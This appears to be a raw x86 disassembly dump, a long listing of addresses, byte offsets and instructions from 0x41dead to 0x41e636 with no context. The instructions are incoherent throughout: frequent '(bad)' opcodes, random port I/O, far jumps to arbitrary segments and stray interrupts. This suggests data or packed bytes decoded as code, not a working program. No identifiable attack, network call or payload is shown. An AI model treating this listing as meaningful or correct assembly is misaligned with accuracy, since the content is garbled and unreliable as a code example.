  41dead:	mov    eax,ds:0x8b2e0bc6
  41deb2:	mov    al,ds:0x69421c5
  41deb7:	mov    ebx,0x20addff2
  41debc:	push   es
  41debd:	xor    BYTE PTR [esi],0x73
  41dec0:	pop    edi
  41dec1:	(bad)  
  41dec2:	out    dx,eax
  41dec3:	jb     0x41de72
  41dec5:	mov    DWORD PTR [ecx-0x3df8ea78],eax
  41decb:	xchg   ebx,eax
  41decc:	repz push ecx
  41dece:	fwait
  41decf:	adc    DWORD PTR [ebp+0x1d],ebx
  41ded2:	outs   dx,BYTE PTR ds:[esi]
  41ded3:	test   BYTE PTR [ebp+0x16ea7505],al
  41ded9:	pop    ebp
  41deda:	in     al,dx
  41dedb:	sbb    edx,esp
  41dedd:	add    eax,DWORD PTR [eax-0x41]
  41dee0:	ret    0x53cd
  41dee3:	cdq    
  41dee4:	scas   al,BYTE PTR es:[edi]
  41dee5:	out    0x3e,eax
  41dee7:	pop    es
  41dee8:	push   edi
  41dee9:	neg    BYTE PTR [ebx+ebx*2-0x4bcbf45b]
  41def0:	dec    eax
  41def1:	mov    al,0x19
  41def3:	sbb    esp,DWORD PTR [edx+ecx*8+0x26]
  41def7:	adc    bh,BYTE PTR [eax]
  41def9:	out    dx,al
  41defa:	popf   
  41defb:	or     al,0x7e
  41defd:	mov    WORD PTR [edx+esi*1+0x5c],ss
  41df01:	add    DWORD PTR [ecx-0x52],ecx
  41df04:	clc    
  41df05:	call   FWORD PTR [ecx+0x78588fb8]
  41df0b:	(bad)  
  41df0c:	data16 ss mov cl,0x7
  41df10:	jecxz  0x41df77
  41df12:	sub    BYTE PTR [edx+0x51],0x8e
  41df16:	adc    al,0xc9
  41df18:	sbb    BYTE PTR [ebp+0x6ef999cf],bl
  41df1e:	(bad)  
  41df1f:	fldcw  WORD PTR [ebx+edi*8+0x210f8df7]
  41df26:	jge    0x41dedc
  41df28:	jo     0x41def9
  41df2a:	adc    DWORD PTR [eax+0x6f99dbfb],edi
  41df30:	push   cs
  41df31:	rcr    DWORD PTR [si+0x38],1
  41df35:	mov    DWORD PTR [ebx],0xf6e51f18
  41df3b:	xor    edx,ebx
  41df3d:	mov    eax,0x66d69842
  41df42:	add    esp,DWORD PTR [edx-0x25]
  41df45:	xchg   edi,eax
  41df46:	dec    edx
  41df47:	loope  0x41df76
  41df49:	jne    0x41df51
  41df4b:	or     ebp,eax
  41df4d:	fs push 0xffffffc9
  41df50:	sub    eax,0x7b9700f
  41df55:	pusha  
  41df56:	int    0x7e
  41df58:	sbb    al,BYTE PTR [eax-0x50db8a96]
  41df5e:	jl     0x41df8e
  41df60:	sbb    ebx,DWORD PTR [edx-0x32691a35]
  41df66:	mov    edi,0x4613a133
  41df6b:	mov    eax,DWORD PTR [ebp-0x55]
  41df6e:	pop    ebp
  41df6f:	stc    
  41df70:	mov    dl,BYTE PTR [edx]
  41df72:	popf   
  41df73:	sub    ch,BYTE PTR [edx-0x11]
  41df76:	push   es
  41df77:	jmp    0x2953:0xafdd33e
  41df7e:	or     esi,DWORD PTR [edi]
  41df80:	sbb    BYTE PTR [eax+0x4e],0x38
  41df84:	inc    di
  41df86:	dec    ebp
  41df87:	ins    BYTE PTR es:[edi],dx
  41df88:	loopne 0x41df58
  41df8a:	push   ss
  41df8b:	push   es
  41df8c:	mov    edi,0xf4b65ed5
  41df91:	out    dx,al
  41df92:	sub    edi,edi
  41df94:	fnstenv [esi-0x46]
  41df97:	ret    0x924d
  41df9a:	lock jae 0x41dfd7
  41df9d:	add    ebx,esi
  41df9f:	xchg   edx,eax
  41dfa0:	mov    dl,0x84
  41dfa2:	mov    ebx,0x7268b43
  41dfa7:	jg     0x41dfb2
  41dfa9:	sbb    DWORD PTR [ecx-0x6d7dd4b],edi
  41dfaf:	xchg   esp,eax
  41dfb0:	fnstcw WORD PTR [edx+0x7a]
  41dfb3:	and    DWORD PTR [esp+eax*1-0x1980f819],ebx
  41dfba:	xor    al,0xcb
  41dfbc:	push   0x4e
  41dfbe:	dec    esp
  41dfbf:	mov    bh,0x9a
  41dfc1:	ret    0x2edb
  41dfc4:	push   ds
  41dfc5:	shr    DWORD PTR [edx],1
  41dfc7:	aad    0x69
  41dfc9:	retf   
  41dfca:	mov    ebx,DWORD PTR [ecx-0x6e]
  41dfcd:	xlat   BYTE PTR ds:[ebx]
  41dfce:	xchg   ebp,eax
  41dfcf:	pop    ebp
  41dfd0:	lds    edx,FWORD PTR [edx+0x79]
  41dfd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfd4:	dec    ebp
  41dfd5:	call   0x815d:0x699626d
  41dfdc:	outs   dx,DWORD PTR ds:[esi]
  41dfdd:	add    ebp,DWORD PTR [ecx+0x58]
  41dfe0:	shl    edx,0x8c
  41dfe3:	fxch   st(3)
  41dfe5:	push   0xc
  41dfe7:	rol    DWORD PTR [ecx-0x25763f0e],cl
  41dfed:	mov    esi,0x3f9db38
  41dff2:	mov    edx,0x14ab1b90
  41dff7:	pop    eax
  41dff8:	(bad)
  41dffb:	lea    ebp,[eax-0x7a161474]
  41e001:	jmp    0xf474d8e6
  41e006:	inc    edx
  41e007:	call   0x84e0:0xc4e7f28a
  41e00e:	or     edx,DWORD PTR [edi-0xf]
  41e011:	mov    bh,0xbe
  41e013:	mov    cl,0x42
  41e015:	jl     0x41dfda
  41e017:	and    bh,BYTE PTR ds:0xdcace13a
  41e01d:	mov    al,ds:0xd68ac2a1
  41e022:	adc    dh,BYTE PTR [edx-0x16]
  41e025:	dec    ebp
  41e026:	jns    0x41e02a
  41e028:	fld    st(2)
  41e02a:	jmp    0x41e093
  41e02c:	push   es
  41e02d:	mov    esi,0x5f856a28
  41e032:	out    0x1a,al
  41e034:	stc    
  41e035:	inc    edi
  41e036:	xchg   ebp,eax
  41e037:	call   0x5215079d
  41e03c:	dec    ecx
  41e03d:	and    BYTE PTR [edi+0x1f],0x5b
  41e041:	push   0xf
  41e043:	call   0xc1c3:0x2e9046d1
  41e04a:	ss in  eax,dx
  41e04c:	int    0xd5
  41e04e:	sbb    eax,0xd423bd38
  41e053:	dec    edi
  41e054:	mov    bh,0xca
  41e056:	dec    eax
  41e057:	(bad)  
  41e058:	es push 0x8cec78d0
  41e05e:	fdivr  DWORD PTR [edx]
  41e060:	(bad)  
  41e061:	out    0x65,al
  41e063:	into   
  41e064:	std    
  41e065:	mov    eax,fs
  41e067:	inc    ebx
  41e068:	add    eax,0xdccbb39e
  41e06d:	mov    DWORD PTR [edx],0xd98fd1e3
  41e073:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e074:	mov    eax,0xfffad936
  41e079:	xor    DWORD PTR [eax],0x3c0b455
  41e07f:	in     eax,dx
  41e080:	cmp    ch,BYTE PTR [eax]
  41e082:	cmp    DWORD PTR [eax-0x44],0x28
  41e086:	or     ah,BYTE PTR [edx+eax*4-0x7b]
  41e08a:	gs fwait
  41e08c:	cmp    al,0xe5
  41e08e:	in     al,0x44
  41e090:	rcr    BYTE PTR [eax+0x4],1
  41e093:	push   eax
  41e094:	and    eax,0x6dea0355
  41e099:	dec    BYTE PTR [edi]
  41e09b:	enter  0xd0ad,0xf1
  41e09f:	push   edx
  41e0a0:	sti    
  41e0a1:	mov    ecx,0xf595b223
  41e0a6:	xor    al,0x9f
  41e0a8:	and    ebp,DWORD PTR [edi+ebp*4+0x5a88294d]
  41e0af:	add    ebx,DWORD PTR [ecx]
  41e0b1:	enter  0x5af5,0xbd
  41e0b5:	dec    ecx
  41e0b6:	mov    ebp,0x64c6f270
  41e0bb:	sti    
  41e0bc:	or     BYTE PTR [edx+0x6e],bl
  41e0bf:	mov    bl,0xde
  41e0c1:	mov    ah,0x95
  41e0c3:	push   edx
  41e0c4:	pop    esi
  41e0c5:	loope  0x41e13b
  41e0c7:	mov    ds:0xf1341cf2,eax
  41e0cc:	inc    edx
  41e0cd:	cmp    eax,0xbdd3e9fd
  41e0d2:	das    
  41e0d3:	pop    esp
  41e0d4:	(bad)  
  41e0d6:	and    BYTE PTR [eax-0x36e136cd],cl
  41e0dc:	stc    
  41e0dd:	aam    0x6e
  41e0df:	mov    edi,0x2111942
  41e0e4:	aam    0xd2
  41e0e6:	in     eax,dx
  41e0e7:	ds mov dh,0x8c
  41e0ea:	(bad)  
  41e0eb:	push   esp
  41e0ec:	shl    DWORD PTR [esi-0x78],0x1b
  41e0f0:	adc    ebp,DWORD PTR [edi+0x16]
  41e0f3:	or     esi,ebx
  41e0f5:	dec    edx
  41e0f6:	data16 in al,0xf
  41e0f9:	rsm    
  41e0fb:	(bad)  
  41e0fd:	jns    0x41e0c4
  41e0ff:	pop    esi
  41e100:	fs jecxz 0x41e102
  41e103:	imul   BYTE PTR [eax+0x45]
  41e106:	jnp    0x41e0b6
  41e108:	sub    esi,DWORD PTR [eax]
  41e10a:	xor    BYTE PTR [esi-0x48d6617c],ch
  41e110:	nop
  41e111:	xchg   ecx,eax
  41e112:	xchg   ecx,eax
  41e113:	loopne 0x41e098
  41e115:	sti    
  41e116:	rcl    BYTE PTR [ecx+0x1c390a39],1
  41e11c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e11d:	fcmovnb st,st(0)
  41e11f:	mov    es,WORD PTR [edx]
  41e121:	push   0xfffffff8
  41e123:	cdq    
  41e124:	and    cl,BYTE PTR [ebx+0x68]
  41e127:	add    eax,0x1b68281a
  41e12c:	adc    cl,al
  41e12e:	pop    es
  41e12f:	xchg   ebp,eax
  41e130:	out    0x2c,eax
  41e132:	sub    edi,edi
  41e134:	daa    
  41e135:	jmp    0x7fca:0x213e161d
  41e13c:	xchg   esp,eax
  41e13d:	mov    gs,ecx
  41e13f:	clc    
  41e140:	mov    ch,BYTE PTR [edi-0x11]
  41e143:	xor    ebx,esi
  41e145:	retf   
  41e146:	mov    al,0xe7
  41e148:	cmp    ch,BYTE PTR [ebx]
  41e14a:	mov    ah,0xc5
  41e14c:	mov    bh,0xa8
  41e14e:	sbb    eax,0x1ccb7c99
  41e153:	nop
  41e154:	test   DWORD PTR [eax-0x53],esp
  41e157:	(bad)  
  41e158:	jnp    0x41e120
  41e15a:	rcr    eax,1
  41e15c:	into   
  41e15d:	cld    
  41e15e:	jle    0x41e1cd
  41e160:	popf   
  41e161:	sahf   
  41e162:	cli    
  41e163:	es in  eax,dx
  41e165:	cmc    
  41e166:	jo     0x41e19a
  41e168:	pop    edx
  41e169:	jg     0x41e181
  41e16b:	or     al,0xc7
  41e16d:	adc    edi,DWORD PTR [ebp+0x4]
  41e170:	sbb    DWORD PTR [edx-0x79],0x77
  41e174:	xchg   edi,eax
  41e176:	ret    
  41e177:	or     ecx,DWORD PTR ds:0xa63d57ed
  41e17d:	mov    eax,0x419ab5c
  41e182:	fs mov dh,0xa8
  41e185:	iret   
  41e186:	xlat   BYTE PTR ds:[ebx]
  41e187:	dec    esi
  41e188:	or     BYTE PTR [edi],dh
  41e18a:	mul    ebp
  41e18c:	in     eax,dx
  41e18d:	(bad)  
  41e18f:	stc    
  41e190:	in     eax,0xcd
  41e192:	imul   edi,DWORD PTR [esi+0x28a5d8f],0x73
  41e199:	fnstsw WORD PTR [esi+0x4c85ec73]
  41e19f:	adc    eax,0x39f11822
  41e1a4:	fst    DWORD PTR [ebp-0x18b7502f]
  41e1aa:	or     al,0xac
  41e1ac:	xor    al,0xa8
  41e1ae:	stc    
  41e1af:	(bad)  
  41e1b0:	ficomp DWORD PTR [ebp+0x2e]
  41e1b3:	(bad)  
  41e1b4:	aam    0x55
  41e1b6:	je     0x41e1e0
  41e1b8:	add    BYTE PTR [eax],ch
  41e1ba:	mov    al,0x82
  41e1bc:	xor    BYTE PTR [ebp-0x2],dl
  41e1bf:	xor    DWORD PTR [edi+0x6827d8e0],esp
  41e1c5:	inc    esi
  41e1c6:	sbb    al,0xd8
  41e1c8:	mov    eax,0x762ba676
  41e1cd:	ret    0xdd60
  41e1d0:	jl     0x41e216
  41e1d2:	xchg   ebx,eax
  41e1d3:	mov    ds:0xf3c05998,al
  41e1d8:	sub    ecx,DWORD PTR [eax]
  41e1da:	je     0x41e1de
  41e1dc:	mov    ch,0xfa
  41e1de:	xchg   ebp,eax
  41e1df:	sbb    BYTE PTR [ebx+0x3dc1386e],dl
  41e1e5:	mov    al,ds:0x87a40f8f
  41e1ea:	inc    esi
  41e1eb:	cmp    ebx,0x4a
  41e1ee:	fadd   st(0),st
  41e1f0:	ror    bh,1
  41e1f2:	ret    0xab4b
  41e1f5:	mov    edx,0x758b90db
  41e1fa:	lods   al,BYTE PTR ds:[esi]
  41e1fb:	retf   
  41e1fc:	jle    0x41e23d
  41e1fe:	cmp    eax,0x58957580
  41e203:	leave  
  41e204:	in     al,0x67
  41e206:	mov    esp,0x1c53ebd
  41e20b:	inc    BYTE PTR ds:0x87fa576c
  41e211:	push   edx
  41e212:	push   edi
  41e213:	jmp    0x68163a3a
  41e218:	mov    ebp,DWORD PTR [eax+0x1763e910]
  41e21e:	xor    al,0x81
  41e220:	jle    0x41e1de
  41e222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e223:	adc    ch,BYTE PTR [esi-0x6b16f62c]
  41e229:	or     eax,0xe324deed
  41e22e:	mov    edx,0x2b75bea7
  41e233:	push   es
  41e234:	add    al,0x86
  41e236:	loopne 0x41e249
  41e238:	and    bh,dl
  41e23a:	sub    DWORD PTR [ebx+0x3d68840e],esp
  41e240:	pop    ebx
  41e241:	imul   edi,esi,0x66
  41e244:	cwde   
  41e245:	jecxz  0x41e25a
  41e247:	mov    ds:0x52bd593d,al
  41e24c:	dec    ebx
  41e24d:	sub    cl,bl
  41e24f:	scas   eax,DWORD PTR es:[edi]
  41e250:	xchg   DWORD PTR [eax-0x45],ebp
  41e253:	repz mov esi,0x112b2374
  41e259:	js     0x41e21c
  41e25b:	aam    0x9a
  41e25d:	mov    eax,0x4ad332ba
  41e262:	mov    ah,0x7b
  41e264:	out    dx,al
  41e265:	std    
  41e266:	adc    eax,0x11c62466
  41e26b:	fwait
  41e26c:	add    eax,0xa6265969
  41e271:	(bad)  
  41e272:	sbb    edi,esi
  41e274:	cld    
  41e275:	xchg   ebx,eax
  41e276:	fucomi st,st(4)
  41e278:	xchg   al,dh
  41e27a:	inc    esp
  41e27b:	cs dec ecx
  41e27d:	and    al,0xe2
  41e27f:	pop    ecx
  41e280:	mov    edx,0xd1d1d435
  41e285:	dec    edi
  41e286:	mov    dl,0x24
  41e288:	call   0xe472:0x85a47a07
  41e28f:	cli    
  41e290:	in     eax,dx
  41e291:	daa    
  41e292:	xchg   DWORD PTR [edx+0xa],ecx
  41e295:	test   BYTE PTR [edx+0x64],bl
  41e298:	leave  
  41e299:	or     eax,0x42622547
  41e29e:	cmp    al,0x1d
  41e2a0:	sbb    eax,0xf6c5b18c
  41e2a5:	sbb    edx,DWORD PTR [edi]
  41e2a7:	loopne 0x41e22f
  41e2a9:	lea    edi,[ebx]
  41e2ab:	test   BYTE PTR [edi],ah
  41e2ad:	test   esi,ebx
  41e2af:	cmc    
  41e2b0:	int3   
  41e2b1:	stc    
  41e2b2:	mov    ds:0x3b1c38bd,eax
  41e2b7:	clc    
  41e2b8:	enter  0xc25d,0x73
  41e2bc:	out    0xf8,al
  41e2be:	jmp    0x7382ba1f
  41e2c3:	int3   
  41e2c4:	push   ecx
  41e2c5:	xchg   esi,eax
  41e2c6:	dec    esi
  41e2c7:	add    eax,0x8eada1db
  41e2cc:	pop    esp
  41e2cd:	sbb    eax,0x99cf3f90
  41e2d2:	jo     0x41e2cb
  41e2d4:	mov    eax,0x7fc2ca1a
  41e2d9:	sahf   
  41e2da:	adc    DWORD PTR [eax+0x9aa5653],ebx
  41e2e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2e1:	hlt    
  41e2e2:	imul   ebp,eax,0x48
  41e2e5:	pop    esp
  41e2e6:	push   edx
  41e2e7:	fsub   QWORD PTR [ecx]
  41e2e9:	dec    ecx
  41e2ea:	in     eax,0x71
  41e2ec:	inc    edi
  41e2ed:	push   eax
  41e2ee:	inc    esi
  41e2ef:	and    DWORD PTR [edx+eax*1+0x7f],esi
  41e2f3:	cwde   
  41e2f4:	scas   eax,DWORD PTR es:[edi]
  41e2f5:	adc    al,BYTE PTR [eax]
  41e2f7:	xor    eax,0x567ba8e1
  41e2fc:	sub    bl,ch
  41e2fe:	jnp    0x41e303
  41e300:	pop    esi
  41e301:	in     eax,0x9e
  41e303:	push   edx
  41e304:	sub    eax,0xc9718778
  41e309:	xor    eax,0x4f59d8c3
  41e30e:	and    DWORD PTR es:[ecx+eiz*2+0x18],0xffffffca
  41e314:	mov    ah,0xdf
  41e316:	mov    ebp,esi
  41e318:	int    0xa7
  41e31a:	fld    QWORD PTR [ecx+0x25206e49]
  41e320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e321:	adc    ah,dl
  41e323:	xchg   ebx,eax
  41e324:	push   cs
  41e325:	not    DWORD PTR [esi]
  41e327:	jbe    0x41e39f
  41e329:	and    eax,0x3e31e283
  41e32e:	jnp    0x41e2d5
  41e330:	jg     0x41e30a
  41e332:	xor    eax,0xdf137f19
  41e337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e338:	loopne 0x41e390
  41e33a:	push   cs
  41e33b:	gs loopne 0x41e3ae
  41e33e:	and    eax,0x5b8d5b3b
  41e343:	out    dx,eax
  41e344:	inc    ecx
  41e345:	ret    0x3883
  41e348:	sti    
  41e349:	dec    ebp
  41e34a:	and    DWORD PTR [ebx-0x6b],esp
  41e34d:	push   es
  41e34e:	push   cs
  41e34f:	or     cl,BYTE PTR [esi+0x3484cf35]
  41e355:	and    edx,ecx
  41e357:	ds ja  0x41e305
  41e35a:	mov    dl,0x53
  41e35c:	lahf   
  41e35d:	test   al,0xd5
  41e35f:	test   BYTE PTR [ebx+0x5a],0xd6
  41e363:	test   DWORD PTR [ecx+eax*1-0x3a854718],ebp
  41e36a:	(bad)  
  41e36b:	fcom   QWORD PTR [ebx-0xf3d1948]
  41e371:	sub    eax,0x21049288
  41e376:	xchg   BYTE PTR [ebp-0x25],dh
  41e379:	mov    bh,0x27
  41e37b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e37c:	cmp    bl,BYTE PTR gs:[edi+ecx*1+0x3d6fee41]
  41e384:	shl    ah,cl
  41e386:	mov    edx,0x57465a56
  41e38b:	test   al,ah
  41e38d:	int    0x1f
  41e38f:	mov    al,bl
  41e391:	pop    edx
  41e392:	add    BYTE PTR [eax-0x1eb869a8],cl
  41e398:	lahf   
  41e399:	shl    DWORD PTR [edi],0xae
  41e39c:	sbb    dl,BYTE PTR [esi+0x4c06a928]
  41e3a2:	pusha  
  41e3a3:	arpl   WORD PTR [ebx-0x30],ax
  41e3a6:	dec    ebp
  41e3a7:	adc    al,0xaa
  41e3a9:	int    0x76
  41e3ab:	int    0xbd
  41e3ad:	(bad)  
  41e3ae:	jae    0x41e35f
  41e3b0:	(bad)  
  41e3b2:	not    eax
  41e3b4:	add    esi,DWORD PTR [edx-0x37ba6a66]
  41e3ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3bb:	aad    0xbf
  41e3bd:	dec    edi
  41e3be:	adc    al,0xdf
  41e3c0:	rcr    BYTE PTR [edi+0x1e],0x8
  41e3c4:	and    eax,0x19b898d0
  41e3c9:	icebp  
  41e3ca:	mov    edi,DWORD PTR [edx+ebx*1]
  41e3cd:	(bad)  
  41e3ce:	mov    eax,ds:0xaaef8982
  41e3d3:	xchg   al,cl
  41e3d5:	rcl    dh,0x3f
  41e3d8:	xor    ah,bh
  41e3da:	mov    bh,0x46
  41e3dc:	inc    eax
  41e3dd:	mov    dl,0x1b
  41e3df:	daa    
  41e3e0:	jecxz  0x41e3ce
  41e3e2:	jecxz  0x41e441
  41e3e4:	or     DWORD PTR [eax-0x10],eax
  41e3e7:	fmul   st(0),st
  41e3e9:	jmp    0x41e448
  41e3eb:	pop    edx
  41e3ec:	push   ecx
  41e3ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3ee:	adc    ecx,0xffffffeb
  41e3f1:	adc    eax,0xfff7af7f
  41e3f6:	fild   DWORD PTR [ebx]
  41e3f8:	shl    esi,0xdd
  41e3fb:	pop    ebp
  41e3fc:	daa    
  41e3fd:	xchg   esi,eax
  41e3fe:	inc    esi
  41e3ff:	icebp  
  41e400:	mov    eax,DWORD PTR [ecx-0x42eec037]
  41e406:	sub    DWORD PTR [ecx],ebx
  41e408:	jp     0x41e43a
  41e40a:	mov    al,ds:0x14346d77
  41e40f:	xchg   edi,eax
  41e410:	sbb    BYTE PTR [edx],bl
  41e412:	jmp    0xc3e32746
  41e417:	(bad)  
  41e418:	popf   
  41e419:	bound  eax,QWORD PTR [ebp-0x27b958db]
  41e41f:	add    eax,0xc2e6feb9
  41e424:	or     BYTE PTR [edi],al
  41e426:	aas    
  41e427:	inc    edx
  41e428:	popa   
  41e429:	(bad)  
  41e42a:	(bad)  
  41e42c:	mov    eax,0x713af028
  41e431:	mov    DWORD PTR [ebx-0x70],edi
  41e434:	push   ebx
  41e435:	jo     0x41e3cf
  41e437:	or     al,0xc7
  41e439:	test   BYTE PTR [esi-0x484119b9],ch
  41e43f:	or     edi,DWORD PTR [ecx-0x2b8f70a3]
  41e445:	fbld   TBYTE PTR [esp+ecx*2-0x5d07e68e]
  41e44c:	inc    esp
  41e44d:	inc    eax
  41e44e:	mov    ebp,0xabb0fe2
  41e453:	cmp    al,0xa0
  41e455:	inc    ecx
  41e456:	push   es
  41e457:	mov    cl,0x45
  41e459:	nop
  41e45a:	ins    DWORD PTR es:[edi],dx
  41e45b:	xchg   ebp,eax
  41e45c:	(bad)  
  41e45d:	and    al,dh
  41e45f:	inc    edx
  41e460:	pinsrw mm2,WORD PTR [ebx+0x6e],0x3e
  41e465:	xchg   BYTE PTR [eax],ah
  41e467:	add    BYTE PTR [eax+ebx*8+0x202a6dcf],bh
  41e46e:	iret   
  41e46f:	cmp    al,0xc9
  41e471:	xor    ebx,ebp
  41e473:	hlt    
  41e474:	jno    0x41e471
  41e476:	lock and bl,BYTE PTR ds:0x19825c98
  41e47d:	push   eax
  41e47e:	lods   eax,DWORD PTR ds:[esi]
  41e47f:	jecxz  0x41e401
  41e481:	push   0xffffffd6
  41e483:	xlat   BYTE PTR ds:[ebx]
  41e484:	icebp  
  41e485:	mov    cl,0x70
  41e487:	cmp    al,0x2c
  41e489:	add    ebp,ebx
  41e48b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e48c:	nop
  41e48d:	inc    edx
  41e48e:	test   DWORD PTR [ecx-0x2e],eax
  41e491:	push   ds
  41e492:	ins    BYTE PTR es:[edi],dx
  41e493:	loopne 0x41e4e0
  41e495:	fst    DWORD PTR [edx-0x2e33cd4b]
  41e49b:	jnp    0x41e4bd
  41e49d:	fisttp DWORD PTR [esi+0x29232a52]
  41e4a3:	popf   
  41e4a4:	cmp    DWORD PTR [ecx+0x7a7c9576],eax
  41e4aa:	popa   
  41e4ab:	xor    BYTE PTR [esi+0x68],0x7c
  41e4af:	mov    edi,0x84b87fbd
  41e4b4:	stc    
  41e4b5:	iret   
  41e4b6:	and    al,0xdc
  41e4b8:	lds    esi,FWORD PTR [ecx]
  41e4ba:	imul   esi,DWORD PTR [eax+0x1ec80b61],0x2be604ce
  41e4c4:	mov    eax,ds:0x548ee42
  41e4c9:	fwait
  41e4ca:	mov    ah,0xe3
  41e4cc:	js     0x41e48a
  41e4ce:	lds    ebx,FWORD PTR [eax]
  41e4d0:	mov    dh,0xd1
  41e4d2:	pop    edx
  41e4d3:	scas   al,BYTE PTR es:[edi]
  41e4d4:	fidivr DWORD PTR [eax+0x4a04533f]
  41e4da:	xor    DWORD PTR [eax+0x3036b75c],ebp
  41e4e0:	xor    ah,BYTE PTR [eax+ebx*8]
  41e4e3:	std    
  41e4e4:	jecxz  0x41e4eb
  41e4e6:	push   cs
  41e4e7:	xor    bh,BYTE PTR [ecx-0xadddb97]
  41e4ed:	fs sub eax,0x2c2c18bd
  41e4f3:	inc    edx
  41e4f4:	sub    DWORD PTR [eax-0x5],ecx
  41e4f7:	mov    edx,0x42be161e
  41e4fc:	je     0x41e51b
  41e4fe:	loop   0x41e500
  41e500:	cmp    DWORD PTR [ecx+eiz*2-0x712e95f1],edi
  41e507:	mov    DWORD PTR [eax],ebx
  41e509:	into   
  41e50a:	test   al,0x58
  41e50c:	popf   
  41e50d:	sbb    cl,al
  41e50f:	mov    bh,0xca
  41e511:	ins    BYTE PTR es:[edi],dx
  41e512:	pop    es
  41e513:	mov    edx,0x28161ab7
  41e518:	jne    0x41e49b
  41e51a:	ins    BYTE PTR es:[edi],dx
  41e51b:	xor    DWORD PTR [ebp+ecx*4-0x1c0b2d6b],esi
  41e522:	lods   eax,DWORD PTR ds:[esi]
  41e523:	int3   
  41e524:	mov    ebp,0xa4f36624
  41e529:	add    BYTE PTR [ebx+0x1e],ah
  41e52c:	je     0x41e4f6
  41e52e:	mov    esi,0xbe87b390
  41e533:	outs   dx,DWORD PTR ds:[esi]
  41e534:	idiv   DWORD PTR [esi+ebp*2]
  41e537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e538:	test   BYTE PTR [ecx+0x3e],cl
  41e53b:	popa   
  41e53c:	jle    0x41e5b0
  41e53e:	scas   al,BYTE PTR es:[edi]
  41e53f:	push   es
  41e540:	pop    esi
  41e541:	stos   BYTE PTR es:[edi],al
  41e542:	inc    ecx
  41e543:	les    esi,FWORD PTR [esi-0x46]
  41e546:	fwait
  41e547:	imul   ecx,esp,0x12c7a3ff
  41e54d:	pop    ebx
  41e54e:	repnz lock es push 0xfffffff0
  41e553:	scas   eax,DWORD PTR es:[edi]
  41e554:	ins    BYTE PTR es:[edi],dx
  41e555:	mov    DWORD PTR [esi],edx
  41e557:	(bad)  
  41e558:	cld    
  41e559:	icebp  
  41e55a:	push   esi
  41e55b:	push   edi
  41e55c:	in     eax,dx
  41e55d:	or     eax,ecx
  41e55f:	(bad)  [ebp+0x7e3856ff]
  41e565:	fcom   DWORD PTR [ecx+0x561c9399]
  41e56b:	push   cs
  41e56c:	mov    dl,0xaa
  41e56e:	cld    
  41e56f:	adc    DWORD PTR [ecx+0xf39545b],esp
  41e575:	adc    dl,BYTE PTR [eax+0x69]
  41e578:	adc    DWORD PTR [eax-0x73],0xffffff9f
  41e57c:	mov    WORD PTR [edx],?
  41e57e:	ror    DWORD PTR [edi],0x42
  41e581:	dec    ecx
  41e582:	mov    eax,ds:0x3257cb26
  41e587:	push   ebp
  41e588:	inc    edi
  41e589:	out    dx,al
  41e58a:	sbb    bl,0x13
  41e58d:	push   esi
  41e58e:	ins    BYTE PTR es:[edi],dx
  41e58f:	or     bl,BYTE PTR [edx+0x31]
  41e592:	outs   dx,DWORD PTR ds:[esi]
  41e593:	dec    esi
  41e594:	cld    
  41e595:	dec    cx
  41e597:	jb     0x41e581
  41e599:	call   0xebbe698c
  41e59e:	jle    0x41e604
  41e5a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5a2:	inc    eax
  41e5a3:	push   ebp
  41e5a4:	adc    BYTE PTR [esp+edx*2+0x6f],0x35
  41e5a9:	rcl    DWORD PTR [ebp+0x54],1
  41e5ac:	sbb    al,0x8e
  41e5ae:	pause  
  41e5b0:	and    esi,edi
  41e5b2:	mov    ah,0x4c
  41e5b4:	out    dx,al
  41e5b5:	test   eax,0x44c2de2c
  41e5ba:	shl    DWORD PTR [ebp+0x40abc9f6],1
  41e5c0:	loope  0x41e5ba
  41e5c2:	jns    0x41e5bf
  41e5c4:	mov    esp,0x95e6e3d1
  41e5c9:	std    
  41e5ca:	and    eax,ecx
  41e5cc:	xchg   ecx,eax
  41e5cd:	push   ecx
  41e5ce:	(bad)  
  41e5cf:	cmovp  ebp,DWORD PTR [edx-0x52]
  41e5d3:	int3   
  41e5d4:	mov    ch,0xb3
  41e5d6:	add    edx,DWORD PTR [eax]
  41e5d8:	jmp    0x41e64d
  41e5da:	ret    0xf02a
  41e5dd:	hlt    
  41e5de:	xchg   esi,eax
  41e5df:	sahf   
  41e5e0:	ret    0x6dfc
  41e5e3:	dec    ecx
  41e5e4:	add    BYTE PTR [ebp+0x4c],dl
  41e5e7:	sub    ebp,DWORD PTR [eax-0xaf38c82]
  41e5ed:	adc    al,0x5c
  41e5ef:	or     al,bh
  41e5f1:	or     dl,ch
  41e5f3:	pushf  
  41e5f4:	pop    edi
  41e5f5:	call   0xc3acffed
  41e5fa:	dec    eax
  41e5fb:	iret   
  41e5fc:	pop    esi
  41e5fd:	jmp    0xa292c6b2
  41e602:	xor    bl,BYTE PTR [ebp+0xf39b47a]
  41e608:	xchg   BYTE PTR [edi-0x4d],al
  41e60b:	push   edi
  41e60c:	jl     0x41e5d5
  41e60e:	shufps xmm4,xmm4,0x6c
  41e612:	xchg   DWORD PTR [ecx],ecx
  41e614:	xor    BYTE PTR [ebx],cl
  41e616:	jo     0x41e5ae
  41e618:	pusha  
  41e619:	xor    BYTE PTR fs:[esi+0x21e90524],bl
  41e620:	mov    edi,0x9be9ba02
  41e625:	pop    edi
  41e626:	arpl   WORD PTR [edi],sp
  41e628:	inc    esp
  41e629:	loopne 0x41e5ef
  41e62b:	pop    es
  41e62c:	mov    WORD PTR [edi+0x3b],es
  41e62f:	add    DWORD PTR [esi],ebx
  41e631:	rol    BYTE PTR [eax+0x6c],cl
  41e634:	loope  0x41e61f
  41e636:	std    
